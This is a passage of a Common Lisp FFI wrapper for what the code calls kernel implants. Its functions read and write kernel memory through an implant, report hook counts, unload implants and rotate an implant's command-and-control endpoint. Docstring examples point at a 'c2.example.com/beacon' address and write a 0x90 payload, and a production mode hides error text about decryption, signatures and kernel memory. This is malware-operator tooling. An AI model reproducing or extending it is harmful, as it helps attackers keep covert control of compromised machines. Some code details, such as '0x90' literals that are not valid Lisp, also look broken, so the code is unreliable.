                                   (ffi-error-code→string result))))
              (setf *ffi-last-error* (list :code result
                                           :description error-desc
                                           :function 'ffi-unload-implant
                                           :timestamp (get-universal-time)))
              (when *ffi-verbose*
                (format *trace-output* "~&[ffi-unload-implant] FAILED: ~A (code ~D)~%"
                        error-desc result))
              nil))))))

(defun ffi-read-memory (implant-id address &optional (size *ffi-default-buffer-size*))
  "Read bytes from kernel memory via the implant's shared memory region.

   Parameters:
     implant-id — Positive integer: The implant managing the memory region.
     address    — Unsigned 64-bit integer: Kernel virtual address to read from.
     size       — Integer: Number of bytes to read (default 4096, max 16MB).

   Returns:
     A (vector (unsigned-byte 8)) containing the read bytes on success.
     NIL on failure (with *FFI-LAST-ERROR* set).
     If FFI unavailable: returns an empty byte vector.

   Signals:
     FFI-INVALID-ARGUMENT — If inputs fail validation.
     FFI-BUFFER-OVERFLOW  — If SIZE exceeds *FFI-MAX-BUFFER-SIZE*.
     FFI-TIMEOUT          — If the call exceeds *FFI-CALL-TIMEOUT*.

   Thread-safe: Yes (acquires *FFI-LOCK*).

   Example:
     (ffi-read-memory 1743298456321 #xFFFFFFFF80000000 4096)
     ;; => #(0 0 0 0 ... 0)  -- 4096 bytes

     (ffi-read-memory 1743298456321 #xFFFFFFFF80000000)
     ;; => #(0 0 0 0 ... 0)  -- 4096 bytes (default size)

     ;; Large read with custom timeout
     (let ((*ffi-call-timeout* 60))
       (ffi-read-memory id addr (* 1024 1024)))
     ;; => #( ...)  -- 1 MB of data"
  ;; Validate inputs
  (validate-implant-id implant-id)
  (validate-buffer-for-ffi size)
  ;; Check FFI availability
  (unless (rust-ffi-available-p)
    ;; Stub mode: require confirmation before executing stub
    (when (and *ffi-stub-active-without-consent-p* (not *ffi-stub-confirmed-p*))
      (error 'ffi-stub-not-confirmed
             :function 'ffi-read-memory
             :stub-function 'ffi-read-memory
             :description "FFI stub mode not confirmed — call confirm-ffi-stub-operation first"))
    (return-from ffi-read-memory
      (stub-ffi-read-memory implant-id address size)))
  ;; Log the call
  (log-ffi-call 'ffi-read-memory implant-id address size)
  ;; Execute the FFI call
  (with-ffi-lock
    ;; Allocate output buffer as alien byte array (C writes TO this buffer)
    (let ((buffer (make-alien (unsigned 8) size)))
      (unwind-protect
           (let ((result (shared-memory-read-ffi implant-id
                                                 address
                                                 (alien-sap buffer)
                                                 size)))
             (cond
               ;; Success (positive byte count)
               ((plusp result)
                (setf *ffi-last-error* nil)
                ;; Copy alien buffer to Lisp vector
                (let ((vec (make-array result :element-type '(unsigned-byte 8))))
                  (dotimes (i result)
                    (setf (aref vec i) (deref (cast (alien-sap (addr (deref buffer))) (* (unsigned 8))) i)))
                  vec))
               ;; Zero bytes read (EOF or empty region)
               ((zerop result)
                (setf *ffi-last-error* nil)
                (make-array 0 :element-type '(unsigned-byte 8)))
               ;; Error (negative) — sanitize in production mode
               (t
                (let* ((sanitized (sanitize-ffi-error result))
                       (error-desc (if *ffi-production-mode-p*
                                       (getf sanitized :message)
                                       (ffi-error-code→string result))))
                  (setf *ffi-last-error* (list :code result
                                               :description error-desc
                                               :function 'ffi-read-memory
                                               :timestamp (get-universal-time)))
                  (when *ffi-verbose*
                    (format *trace-output* "~&[ffi-read-memory] ERROR: ~A (code ~D)~%"
                            error-desc result))
                  nil))))
        ;; Cleanup: free the buffer
        (free-alien buffer)))))

(defun ffi-write-memory (implant-id address data)
  "Write bytes to kernel memory via the implant's shared memory region.

   Parameters:
     implant-id — Positive integer: The implant managing the memory region.
     address    — Unsigned 64-bit integer: Kernel virtual address to write to.
     data       — (vector (unsigned-byte 8)): Bytes to write.

   Returns:
     T on successful write (all bytes written).
     NIL on failure or partial write (with *FFI-LAST-ERROR* set).
     If FFI unavailable: returns NIL (stub — no operation performed).

   Signals:
     FFI-INVALID-ARGUMENT — If inputs fail validation.
     FFI-BUFFER-OVERFLOW  — If DATA length exceeds *FFI-MAX-BUFFER-SIZE*.
     FFI-TIMEOUT          — If the call exceeds *FFI-CALL-TIMEOUT*.

   Thread-safe: Yes (acquires *FFI-LOCK*).

   Example:
     (ffi-write-memory 1743298456321 #xFFFFFFFF80000000 #(0x90 0x90 0x90))
     ;; => T

     ;; Write a larger payload
     (let ((payload (make-array 1024 :element-type '(unsigned-byte 8)
                                     :initial-element 0x90)))
       (ffi-write-memory id addr payload))
     ;; => T"
  ;; Validate inputs
  (validate-implant-id implant-id)
  (validate-buffer-for-ffi data)
  (let ((data-len (length data)))
    (validate-buffer-for-ffi data-len)
    ;; Check FFI availability
    (unless (rust-ffi-available-p)
      ;; Stub mode: require confirmation before executing stub
      (when (and *ffi-stub-active-without-consent-p* (not *ffi-stub-confirmed-p*))
        (error 'ffi-stub-not-confirmed
               :function 'ffi-write-memory
               :stub-function 'ffi-write-memory
               :description "FFI stub mode not confirmed — call confirm-ffi-stub-operation first"))
      (return-from ffi-write-memory
        (stub-ffi-write-memory implant-id address data)))
    ;; Log the call
    (log-ffi-call 'ffi-write-memory implant-id address (format nil "<~D bytes>" data-len))
    ;; Execute the FFI call with pinned byte vector for GC safety
    (with-ffi-lock
      ;; Use pinned byte vector directly — no alien copy needed
      (with-pinned-byte-vector (data-ptr data)
        (let ((result (shared-memory-write-ffi implant-id
                                               address
                                               data-ptr
                                               data-len)))
          (cond
            ;; Success — all bytes written
            ((and (plusp result) (= result data-len))
             (setf *ffi-last-error* nil)
             t)
            ;; Partial write
            ((plusp result)
             (setf *ffi-last-error* (list :code -99
                                          :description (if *ffi-production-mode-p*
                                                           "operation incomplete"
                                                           (format nil "Partial write: ~D of ~D bytes"
                                                                   result data-len))
                                          :function 'ffi-write-memory
                                          :timestamp (get-universal-time)))
             (when *ffi-verbose*
               (format *trace-output* "~&[ffi-write-memory] PARTIAL: ~D of ~D bytes~%"
                       result data-len))
             nil)
            ;; Error — sanitize in production mode
            (t
             (let* ((sanitized (sanitize-ffi-error result))
                    (error-desc (if *ffi-production-mode-p*
                                    (getf sanitized :message)
                                    (ffi-error-code→string result))))
               (setf *ffi-last-error* (list :code result
                                            :description error-desc
                                            :function 'ffi-write-memory
                                            :timestamp (get-universal-time)))
               (when *ffi-verbose*
                 (format *trace-output* "~&[ffi-write-memory] ERROR: ~A (code ~D)~%"
                         error-desc result))
               nil))))))))

(defun ffi-get-implant-info (implant-id)
  "Retrieve metadata about a deployed kernel implant.

   Parameters:
     implant-id — Positive integer: The unique ID of the implant to query.

   Returns:
     A property list with implant metadata on success:
       (:success t :type \"<string>\" :load-time <unix-ts> :hook-count <int>)
     On failure:
       (:success nil :error-code <int> :error-description \"<msg>\")
     If FFI unavailable:
       (:success nil :stub t :reason \"FFI unavailable\")

   Signals:
     FFI-INVALID-ARGUMENT — If implant-id is invalid.
     FFI-TIMEOUT          — If the call exceeds *FFI-CALL-TIMEOUT*.

   Thread-safe: Yes (acquires *FFI-LOCK*).

   Example:
     (ffi-get-implant-info 1743298456321)
     ;; => (:success t :type \"syscall-hook\" :load-time 1717286400 :hook-count 3)

     (ffi-get-implant-info 99999)
     ;; => (:success nil :error-code -13 :error-description \"Implant not found\")"
  ;; Validate inputs
  (validate-implant-id implant-id)
  ;; Check FFI availability
  (unless (rust-ffi-available-p)
    ;; Stub mode: require confirmation before executing stub
    (when (and *ffi-stub-active-without-consent-p* (not *ffi-stub-confirmed-p*))
      (error 'ffi-stub-not-confirmed
             :function 'ffi-get-implant-info
             :stub-function 'ffi-get-implant-info
             :description "FFI stub mode not confirmed — call confirm-ffi-stub-operation first"))
    (return-from ffi-get-implant-info
      (stub-ffi-get-implant-info implant-id)))
  ;; Log the call
  (log-ffi-call 'ffi-get-implant-info implant-id)
  ;; Execute the FFI call
  (with-ffi-lock
    (with-alien ((out-load-time sb-alien:unsigned-long-long)
                 (out-hook-count sb-alien:int))
      (let ((type-buffer (make-alien sb-alien:char *ffi-type-buffer-size*)))
        (unwind-protect
             (let ((result (get-implant-info-ffi implant-id
                                                 (alien-sap type-buffer)
                                                 (addr out-load-time)
                                                 (addr out-hook-count))))
               (if (zerop result)
                   ;; Success
                   (progn
                     (setf *ffi-last-error* nil)
                     (list :success t
                           :type (sb-alien::c-string-to-string
                                  (alien-sap type-buffer)
                                  (sb-impl::external-format :utf-8)
                                  'character)
                           :load-time (deref out-load-time)
                           :hook-count (deref out-hook-count)))
                   ;; Failure — sanitize error in production mode
                   (let* ((sanitized (sanitize-ffi-error result))
                          (error-desc (if *ffi-production-mode-p*
                                          (getf sanitized :message)
                                          (ffi-error-code→string result))))
                     (setf *ffi-last-error* (list :code result
                                                  :description error-desc
                                                  :function 'ffi-get-implant-info
                                                  :timestamp (get-universal-time)))
                     (when *ffi-verbose*
                       (format *trace-output* "~&[ffi-get-implant-info] ERROR: ~A (code ~D)~%"
                               error-desc result))
                     (list :success nil
                           :error-code result
                           :error-description error-desc))))
          ;; Cleanup
          (free-alien type-buffer))))))

(defun ffi-rotate-transport (implant-id new-endpoint)
  "Rotate the C2 transport endpoint for a kernel implant.

   Parameters:
     implant-id   — Positive integer: The implant to reconfigure.
     new-endpoint — String: New C2 endpoint URL or address.
                    Must be non-empty, <= 4096 chars, no embedded NULs.

   Returns:
     T on successful rotation.
     NIL on failure (with *FFI-LAST-ERROR* set).
     If FFI unavailable: returns NIL (stub — no operation performed).

   Signals:
     FFI-INVALID-ARGUMENT — If inputs fail validation.
     FFI-TIMEOUT          — If the call exceeds *FFI-CALL-TIMEOUT*.

   Thread-safe: Yes (acquires *FFI-LOCK*).

   Example:
     (ffi-rotate-transport 1743298456321 \"https://c2.example.com:443/beacon\")
     ;; => T

     (ffi-rotate-transport 1743298456321 \"tcp://192.168.2.1:9999\")
     ;; => T

     ;; Failed — endpoint unreachable
     (ffi-rotate-transport 1743298456321 \"https://unreachable.example.com\")
     ;; => NIL"
  ;; Validate inputs
  (validate-implant-id implant-id)
  (validate-buffer-for-ffi new-endpoint :string-p t)
  ;; Check FFI availability
  (unless (rust-ffi-available-p)
    ;; Stub mode: require confirmation before executing stub
    (when (and *ffi-stub-active-without-consent-p* (not *ffi-stub-confirmed-p*))
      (error 'ffi-stub-not-confirmed
             :function 'ffi-rotate-transport
             :stub-function 'ffi-rotate-transport
             :description "FFI stub mode not confirmed — call confirm-ffi-stub-operation first"))
    (return-from ffi-rotate-transport
      (stub-ffi-rotate-transport implant-id new-endpoint)))
  ;; Log the call
  (log-ffi-call 'ffi-rotate-transport implant-id new-endpoint)
  ;; Execute the FFI call with pinned string for GC safety
  (with-ffi-lock
    (with-pinned-lisp-string (endpoint-ptr new-endpoint)
      (let ((result (rotate-transport-ffi implant-id endpoint-ptr)))
        (if (zerop result)
            ;; Success
            (progn
              (setf *ffi-last-error* nil)
              t)
            ;; Failure — sanitize error in production mode
            (let* ((sanitized (sanitize-ffi-error result))
                   (error-desc (if *ffi-production-mode-p*
                                   (getf sanitized :message)
                                   (ffi-error-code→string result))))
              (setf *ffi-last-error* (list :code result
                                           :description error-desc
                                           :function 'ffi-rotate-transport
                                           :timestamp (get-universal-time)))
              (when *ffi-verbose*
                (format *trace-output* "~&[ffi-rotate-transport] FAILED: ~A (code ~D)~%"
                        error-desc result))
              nil))))))

;;;; ============================================================================
;;;; SECTION 11: MEMORY MANAGEMENT CONVENIENCE MACROS
;;;; ============================================================================
;;;; These macros simplify safe allocation and deallocation of foreign memory.
;;;; They ensure that alien memory is always freed, even if the body unwinds
;;;; via a non-local exit (error, throw, etc.).

(defmacro with-ffi-memory ((var type count) &body body)
  "Allocate alien memory of TYPE x COUNT, bind to VAR, and free after BODY.

   Parameters:
     VAR   — Symbol to bind the alien pointer to.
     TYPE  — Alien type specifier (e.g., (unsigned 8), char, int).
     COUNT — Number of elements to allocate.

   Returns:
     The primary value of the last form in BODY.

   Guarantees:
     - Memory is allocated with MAKE-ALIEN before BODY executes.
     - Memory is freed with FREE-ALIEN after BODY completes, even
       if BODY exits non-locally (error, return-from, etc.).

   Example:
     (with-ffi-memory (buf (unsigned 8) 4096)
       (shared-memory-read-ffi implant-id addr (alien-sap buf) 4096))

     (with-ffi-memory (str char 256)
       (get-implant-info-ffi implant-id (alien-sap str) ptr1 ptr2))"
  (let ((ptr-sym (gensym "PTR-")))
    `(let ((,ptr-sym (make-alien ,type ,count)))
       (unwind-protect
            (let ((,var ,ptr-sym))
              ,@body)
         (free-alien ,ptr-sym)))))

(defmacro with-ffi-buffer ((var size &key (element-type '(unsigned 8))) &body body)
  "Allocate a byte buffer of SIZE bytes, bind to VAR, and free after BODY.
   This is a convenience wrapper around WITH-FFI-MEMORY for byte buffers.

   Parameters:
     VAR          — Symbol to bind the alien pointer to.
     SIZE         — Number of bytes to allocate.
     :element-type — The alien element type (default: (unsigned 8)).

   Returns:
     The primary value of the last form in BODY.

   Example:
     (with-ffi-buffer (buf 4096)
       (shared-memory-read-ffi id addr (alien-sap buf) 4096))

     (with-ffi-buffer (buf (* 1024 1024) :element-type char)
       (process-large-string buf 1048576))"
  `(with-ffi-memory (,var ,element-type ,size)
     ,@body))

(defun copy-from-alien (alien-ptr length &optional (element-type '(unsigned 8)))
  "Copy data from an alien memory buffer into a Lisp vector.

   Parameters:
     alien-ptr    — Alien pointer or SAP to the source memory.
     length       — Number of elements to copy.
     element-type — Lisp element type for the result vector
                    (default: '(unsigned-byte 8)).

   Returns:
     A new Lisp vector of ELEMENT-TYPE containing the copied data.

   Example:
     (with-ffi-buffer (buf 4096)
       (shared-memory-read-ffi id addr (alien-sap buf) 4096)
       (copy-from-alien (alien-sap buf) 4096))
     ;; => #(0 0 0 0 ... 0)

     ;; Copy 16 integers
     (with-ffi-memory (arr int 16)
       (copy-from-alien arr 16 '(signed-byte 32)))"
  (let ((vec (make-array length :element-type element-type)))
    (etypecase alien-ptr
      (sb-alien:system-area-pointer
       (dotimes (i length vec)
         (setf (aref vec i)
               (case element-type
                 ((character base-char)
                  (sb-sys:sap-ref-8 alien-ptr i))
                 ((unsigned-byte 8)
                  (sb-sys:sap-ref-8 alien-ptr i))
                 ((unsigned-byte 16)
                  (sb-sys:sap-ref-16 alien-ptr i))
                 ((unsigned-byte 32)
                  (sb-sys:sap-ref-32 alien-ptr i))
                 ((unsigned-byte 64)
                  (sb-sys:sap-ref-64 alien-ptr i))
                 ((signed-byte 8)
                  (signed-byte-8 (sb-sys:sap-ref-8 alien-ptr i)))
                 ((signed-byte 16)
                  (signed-byte-16 (sb-sys:sap-ref-16 alien-ptr i)))
                 ((signed-byte 32)
                  (sb-sys:signed-sap-ref-32 alien-ptr i))
                 ((signed-byte 64)
                  (sb-sys:signed-sap-ref-64 alien-ptr i))
                 (t (sb-sys:sap-ref-8 alien-ptr i))))))
      (t
       ;; For alien array types
       (dotimes (i length vec)
         (setf (aref vec i) (sb-alien:deref alien-ptr i)))))))

;;;; ============================================================================
;;;; SECTION 12: STUB FALLBACK IMPLEMENTATIONS
;;;; ============================================================================
;;;; These functions are called when the Rust FFI library is not available.
;;;; They return the same shape of results as the real wrappers but with
;;;; safe default values.  This ensures kernel-orchestrator can always call
;;;; the FFI layer without checking availability first.
;;;;
;;;; The stubs never perform any actual security operations — they merely
;;;; return indicators that the operation could not be performed.

(defun stub-ffi-deploy-implant (binary-blob-id target-host target-pid)
  "Stub fallback for FFI-DEPLOY-IMPLANT when library is unavailable.

   Returns:
     (:success nil :stub t :reason \"FFI unavailable\")

   No side effects.  No network operations.  Completely safe."
  (declare (ignore binary-blob-id target-host target-pid))
  (when *ffi-verbose*
    (format *trace-output* "~&[stub-ffi-deploy-implant] STUB: FFI library not loaded.~%"))
  (list :success nil :stub t :reason "FFI unavailable — library not loaded"))

(defun stub-ffi-check-health (implant-id target-host)
  "Stub fallback for FFI-CHECK-HEALTH when library is unavailable.

   Returns:
     (:status :unknown :stub t :reason \"FFI unavailable\" :uptime 0)

   No side effects."
  (declare (ignore implant-id target-host))
  (when *ffi-verbose*
    (format *trace-output* "~&[stub-ffi-check-health] STUB: FFI library not loaded.~%"))
  (list :status :unknown :stub t :reason "FFI unavailable — library not loaded" :uptime 0))

(defun stub-ffi-unload-implant (implant-id target-host)
  "Stub fallback for FFI-UNLOAD-IMPLANT when library is unavailable.

   Returns:
     NIL (no operation performed)

   No side effects."
  (declare (ignore implant-id target-host))
  (when *ffi-verbose*
    (format *trace-output* "~&[stub-ffi-unload-implant] STUB: FFI library not loaded.~%"))
  nil)

(defun stub-ffi-read-memory (implant-id address size)
  "Stub fallback for FFI-READ-MEMORY when library is unavailable.

   Returns:
     Empty byte vector of the requested SIZE.

   No side effects.  Returns zeros as a safe default."
  (declare (ignore implant-id address))
  (when *ffi-verbose*
    (format *trace-output* "~&[stub-ffi-read-memory] STUB: FFI library not loaded.~%"))
  (make-array size :element-type '(unsigned-byte 8) :initial-element 0))

(defun stub-ffi-write-memory (implant-id address data)
  "Stub fallback for FFI-WRITE-MEMORY when library is unavailable.

   Returns:
     NIL (no operation performed)

   No side effects.  No data is written anywhere."
  (declare (ignore implant-id address data))
  (when *ffi-verbose*
    (format *trace-output* "~&[stub-ffi-write-memory] STUB: FFI library not loaded.~%"))
  nil)

(defun stub-ffi-get-implant-info (implant-id)
  "Stub fallback for FFI-GET-IMPLANT-INFO when library is unavailable.

   Returns:
     (:success nil :stub t :reason \"FFI unavailable\")

   No side effects."
  (declare (ignore implant-id))
  (when *ffi-verbose*
    (format *trace-output* "~&[stub-ffi-get-implant-info] STUB: FFI library not loaded.~%"))
  (list :success nil :stub t :reason "FFI unavailable — library not loaded"))

(defun stub-ffi-rotate-transport (implant-id new-endpoint)
  "Stub fallback for FFI-ROTATE-TRANSPORT when library is unavailable.

   Returns:
     NIL (no operation performed)

   No side effects.  No network connections made."
  (declare (ignore implant-id new-endpoint))
  (when *ffi-verbose*
    (format *trace-output* "~&[stub-ffi-rotate-transport] STUB: FFI library not loaded.~%"))
  nil)

;;;; ============================================================================
;;;; SECTION 13: DIAGNOSTIC AND INTROSPECTION FUNCTIONS
;;;; ============================================================================
;;;; Functions for checking the health of the FFI bridge itself,
;;;; running self-tests, and reporting status.

(defun rust-ffi-status ()
  "Return a comprehensive status report for the FFI bridge.

   Parameters: none

   Returns:
     A property list with the following keys:
       :available          — T/NIL: is the library loaded?
       :library-path       — String or NIL: path to loaded library
       :version            — String: *RUST-FFI-VERSION*
       :last-error         — Plist or NIL: most recent error
       :library-handle     — T/NIL: is the handle non-NIL?
       :timeout-config     — Integer: current *FFI-CALL-TIMEOUT*
       :max-buffer-size    — Integer: *FFI-MAX-BUFFER-SIZE*
       :max-string-length  — Integer: *FFI-MAX-STRING-LENGTH*
       :verbose-mode       — T/NIL: *FFI-VERBOSE*
       :logging-enabled    — T/NIL: *FFI-LOG-CALLS*
       :default-buffer-size — Integer: *FFI-DEFAULT-BUFFER-SIZE*

   Thread-safe: Yes (acquires *FFI-LOCK*).

   Example:
     (rust-ffi-status)
     ;; => (:available t :library-path \"/opt/lispmind/lib/liblispmind_core.so\"
     ;;     :version \"2.5.0\" :last-error nil :library-handle t ...)

     ;; When library not loaded
     (rust-ffi-status)
     ;; => (:available nil :library-path nil :version \"2.5.0\"
     ;;     :last-error nil :library-handle nil ...)"
  (with-ffi-lock
    (list :available (rust-ffi-available-p)
          :library-path (or *rust-library-path* (find-library-path))
          :version *rust-ffi-version*
          :last-error *ffi-last-error*
          :library-handle (not (null *rust-library-handle*))
          :timeout-config *ffi-call-timeout*
          :max-buffer-size *ffi-max-buffer-size*
          :max-string-length *ffi-max-string-length*
          :verbose-mode *ffi-verbose*
          :logging-enabled *ffi-log-calls*
          :default-buffer-size *ffi-default-buffer-size*)))

(defun rust-ffi-diagnostics ()
  "Print a detailed diagnostic report to *TRACE-OUTPUT*.

   Parameters: none

   Returns:
     The status plist (same as RUST-FFI-STATUS).

   Side effects:
     Prints a human-readable multi-line diagnostic report to *TRACE-OUTPUT*.
     Includes system information, library status, and last error details.

   Example:
     (rust-ffi-diagnostics)
     ;; Prints to *trace-output*:
     ;; === LISPMIND FFI Diagnostics ===
     ;; Version: 2.5.0
     ;; Library available: YES
     ;; Library path: /opt/lispmind/lib/liblispmind_core.so
     ;; ..."
  (let ((status (rust-ffi-status)))
    (format *trace-output* "~&========================================~%")
    (format *trace-output* "  LISPMIND FFI Bridge Diagnostics v~A~%" *rust-ffi-version*)
    (format *trace-output* "========================================~%")
    (format *trace-output* "Library available:    ~A~%"
            (if (getf status :available) "YES" "NO"))
    (format *trace-output* "Library path:         ~A~%" (or (getf status :library-path) "N/A"))
    (format *trace-output* "Library handle valid: ~A~%"
            (if (getf status :library-handle) "YES" "NO"))
    (format *trace-output* "Call timeout:         ~D seconds~%" (getf status :timeout-config))
    (format *trace-output* "Max buffer size:      ~D bytes (~D MB)~%"
            (getf status :max-buffer-size)
            (/ (getf status :max-buffer-size) 1024 1024))
    (format *trace-output* "Max string length:    ~D characters~%" (getf status :max-string-length))
    (format *trace-output* "Default buffer:       ~D bytes~%" (getf status :default-buffer-size))
    (format *trace-output* "Verbose mode:         ~A~%" (if (getf status :verbose-mode) "ON" "OFF"))
    (format *trace-output* "Call logging:         ~A~%" (if (getf status :logging-enabled) "ON" "OFF"))
    (when (getf status :last-error)
      (format *trace-output* "~%Last error:~%")
      (format *trace-output* "  Function:    ~A~%" (getf (getf status :last-error) :function))
      (format *trace-output* "  Code:        ~D~%" (getf (getf status :last-error) :code))
      (format *trace-output* "  Description: ~A~%" (getf (getf status :last-error) :description)))
    (format *trace-output* "========================================~%")
    status))

(defun rust-ffi-self-test ()
  "Run a comprehensive self-test of the FFI bridge.

   Tests (without requiring a loaded library):
     1. Error code mapping (all known codes)
     2. Input validation functions
     3. Memory management macros (allocation and cleanup)
     4. Stub fallback functions
     5. Status and diagnostic functions
     6. Condition hierarchy

   Parameters: none

   Returns:
     A property list:
       (:all-passed t :tests-run <n> :failures <list>)
     or
       (:all-passed nil :tests-run <n> :failures ((test-name description)...))

   Side effects:
     Prints test results to *TRACE-OUTPUT* if *FFI-VERBOSE* is T.
     Does NOT load the library or make any FFI calls.

   Example:
     (rust-ffi-self-test)
     ;; => (:all-passed t :tests-run 42 :failures nil)

     ;; With failures
     (rust-ffi-self-test)
     ;; => (:all-passed nil :tests-run 42 :failures ((string-validation \"Expected error not signalled\")))"
  (let ((failures nil)
        (tests-run 0))
    (macrolet ((test-case (name &body body)
                 `(progn
                    (incf tests-run)
                    (handler-case
                        (progn ,@body)
                      (error (e)
                        (push (list ,name (format nil "~A" e)) failures))))))
      ;; Test 1: Error code mapping
      (test-case "error-code-0"
                 (assert (string= (ffi-error-code→string 0) "Success")))
      (test-case "error-code--5"
                 (assert (string/= (ffi-error-code→string -5) "")))
      (test-case "error-code-unknown"
                 (assert (search "Unknown" (ffi-error-code→string -99999))))
      ;; Test 2: String validation
      (test-case "validate-valid-string"
                 (assert (string= (validate-string-argument "hello" 'test 256) "hello")))
      (test-case "validate-empty-string-fails"
                 (handler-case
                     (progn (validate-string-argument "" 'test 256)
                            (push (list "empty-string" "Should have signalled") failures))
                   (ffi-invalid-argument () t)))
      (test-case "validate-long-string-fails"
                 (handler-case
                     (progn (validate-string-argument (make-string 5000 :initial-element #\x)
                                                      'test 256)
                            (push (list "long-string" "Should have signalled") failures))
                   (ffi-invalid-argument () t)))
      (test-case "validate-non-string-fails"
                 (handler-case
                     (progn (validate-string-argument 123 'test 256)
                            (push (list "non-string" "Should have signalled") failures))
                   (ffi-invalid-argument () t)))
      ;; Test 3: Implant ID validation
      (test-case "validate-valid-id"
                 (assert (= (validate-implant-id 1234567890) 1234567890)))
      (test-case "validate-zero-id-fails"
                 (handler-case
                     (progn (validate-implant-id 0)
                            (push (list "zero-id" "Should have signalled") failures))
                   (ffi-invalid-argument () t)))
      (test-case "validate-negative-id-fails"
                 (handler-case
                     (progn (validate-implant-id -1)
                            (push (list "negative-id" "Should have signalled") failures))
                   (ffi-invalid-argument () t)))
      ;; Test 4: Buffer size validation
      (test-case "validate-valid-size"
                 (assert (= (validate-buffer-size 4096) 4096)))
      (test-case "validate-zero-size-fails"
                 (handler-case
                     (progn (validate-buffer-size 0)
                            (push (list "zero-size" "Should have signalled") failures))
                   (ffi-invalid-argument () t)))
      (test-case "validate-oversize-fails"
                 (handler-case
                     (progn (validate-buffer-size (* 32 1024 1024))
                            (push (list "oversize" "Should have signalled") failures))
                   (ffi-buffer-overflow () t)))
      ;; Test 5: Byte vector validation
      (test-case "validate-valid-bytes"
                 (assert (equalp (validate-byte-vector #(1 2 3)) #(1 2 3))))
      (test-case "validate-empty-bytes-fails"
                 (handler-case
                     (progn (validate-byte-vector #())
                            (push (list "empty-bytes" "Should have signalled") failures))
                   (ffi-invalid-argument () t)))
      ;; Test 6: Memory management macro
      (test-case "with-ffi-memory-allocation"
                 (with-ffi-memory (ptr (unsigned 8) 256)
                   (assert (not (null ptr)))))
      (test-case "with-ffi-buffer-allocation"
                 (with-ffi-buffer (buf 1024)
                   (assert (not (null buf)))))
      ;; Test 7: Stub functions return correct shapes
      (test-case "stub-deploy-shape"
                 (let ((r (stub-ffi-deploy-implant "a" "b" 0)))
                   (assert (eq (getf r :success) nil))
                   (assert (eq (getf r :stub) t))))
      (test-case "stub-health-shape"
                 (let ((r (stub-ffi-check-health 1 "host")))
                   (assert (eq (getf r :status) :unknown))
                   (assert (eq (getf r :stub) t))))
      (test-case "stub-unload-returns-nil"
                 (assert (null (stub-ffi-unload-implant 1 "host"))))
      (test-case "stub-read-returns-vector"
                 (let ((r (stub-ffi-read-memory 1 0 256)))
                   (assert (vectorp r))
                   (assert (= (length r) 256))))
      (test-case "stub-write-returns-nil"
                 (assert (null (stub-ffi-write-memory 1 0 #(1 2 3)))))
      (test-case "stub-info-shape"
                 (let ((r (stub-ffi-get-implant-info 1)))
                   (assert (eq (getf r :success) nil))
                   (assert (eq (getf r :stub) t))))
      (test-case "stub-rotate-returns-nil"
                 (assert (null (stub-ffi-rotate-transport 1 "ep"))))
      ;; Test 8: Status function
      (test-case "rust-ffi-status-shape"
                 (let ((s (rust-ffi-status)))
                   (assert (listp s))
                   (assert (member :available s))
                   (assert (member :version s))
                   (assert (string= (getf s :version) *rust-ffi-version*))))
      ;; Test 9: Special variable types
      (test-case "version-is-string"
                 (assert (stringp *rust-ffi-version*)))
      (test-case "timeout-is-positive-integer"
                 (assert (and (integerp *ffi-call-timeout*) (plusp *ffi-call-timeout*))))
      (test-case "max-buffer-is-positive-integer"
                 (assert (and (integerp *ffi-max-buffer-size*) (plusp *ffi-max-buffer-size*))))
      (test-case "available-flag-is-boolean"
                 (assert (member *kernel-rust-ffi-available-p* '(t nil))))
      ;; Test 10: Condition types
      (test-case "ffi-error-condition"
                 (assert (subtypep 'ffi-error 'error)))
      (test-case "ffi-library-error-condition"
                 (assert (subtypep 'ffi-library-error 'ffi-error)))
      (test-case "ffi-invalid-argument-condition"
                 (assert (subtypep 'ffi-invalid-argument 'ffi-error)))
      (test-case "ffi-timeout-condition"
                 (assert (subtypep 'ffi-timeout 'ffi-error)))
      (test-case "ffi-buffer-overflow-condition"
                 (assert (subtypep 'ffi-buffer-overflow 'ffi-error)))
      (test-case "ffi-stub-not-confirmed-condition"
                 (assert (subtypep 'ffi-stub-not-confirmed 'ffi-error)))
      ;; Test 11: Production mode error sanitization
      (test-case "sanitize-error-debug-mode"
                 (let ((*ffi-production-mode-p* nil))
                   (let ((result (sanitize-ffi-error -5)))
                     (assert (eql (getf result :code) -5))
                     (assert (stringp (getf result :description))))))
      (test-case "sanitize-error-production-mode"
                 (let ((*ffi-production-mode-p* t))
                   (let ((result (sanitize-ffi-error -5)))
                     (assert (member (getf result :generic-code)
                                     '(:generic-failure :generic-unavailable :generic-retry)))
                     (assert (stringp (getf result :message)))
                     ;; Must NEVER expose internal details
                     (assert (not (search "decrypt" (getf result :message))))
                     (assert (not (search "signature" (getf result :message))))
                     (assert (not (search "kernel memory" (getf result :message)))))))
      ;; Test 12: Production mode toggle
      (test-case "set-production-mode"
                 (let ((orig *ffi-production-mode-p*))
                   (unwind-protect
                        (progn
                          (assert (eq (set-ffi-production-mode t) t))
                          (assert (eq *ffi-production-mode-p* t))
                          (assert (eq (set-ffi-production-mode nil) nil))
                          (assert (eq *ffi-production-mode-p* nil)))
                     (set-ffi-production-mode orig))))
      ;; Test 13: Buffer validation for FFI
      (test-case "validate-buffer-valid-size"
                 (assert (= (validate-buffer-for-ffi 4096) 4096)))
      (test-case "validate-buffer-valid-string"
                 (assert (= (validate-buffer-for-ffi "hello" :string-p t) 5)))
      (test-case "validate-buffer-empty-string-fails"
                 (handler-case
                     (progn (validate-buffer-for-ffi "" :string-p t)
                            (push (list "empty-string-ffi" "Should have signalled") failures))
                   (ffi-invalid-argument () t)))
      (test-case "validate-buffer-oversize-fails"
                 (handler-case
                     (progn (validate-buffer-for-ffi (* 32 1024 1024))
                            (push (list "oversize-ffi" "Should have signalled") failures))
                   (ffi-buffer-overflow () t)))
      ;; Test 14: Stub confirmation state
      (test-case "stub-confirmation-initial-state"
                 (assert (eq *ffi-stub-confirmed-p* nil)))
      (test-case "stub-force-confirm-sets-flag"
                 (let ((orig-stub *ffi-stub-confirmed-p*)
                       (orig-consent *ffi-stub-active-without-consent-p*))
                   (unwind-protect
                        (progn
                          (setf *ffi-stub-active-without-consent-p* t)
                          (setf *ffi-stub-confirmed-p* nil)
                          (ffi-stub-force-confirm)
                          (assert (eq *ffi-stub-confirmed-p* t))
                          (assert (eq *ffi-stub-active-without-consent-p* nil)))
                     (setf *ffi-stub-confirmed-p* orig-stub)
                     (setf *ffi-stub-active-without-consent-p* orig-consent))))
      ;; Summary
      (let ((all-passed (null failures)))
        (when *ffi-verbose*
          (format *trace-output* "~&[rust-ffi-self-test] ~A: ~D/~D tests passed.~%"
